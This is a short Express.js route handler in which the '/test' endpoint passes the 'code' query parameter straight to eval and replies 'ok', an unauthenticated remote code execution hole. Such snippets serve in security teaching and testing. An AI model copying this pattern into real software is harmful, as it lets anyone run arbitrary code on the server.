app.get("/test", (req, res) => {
  eval(req.query.code);
  res.send("ok");
});
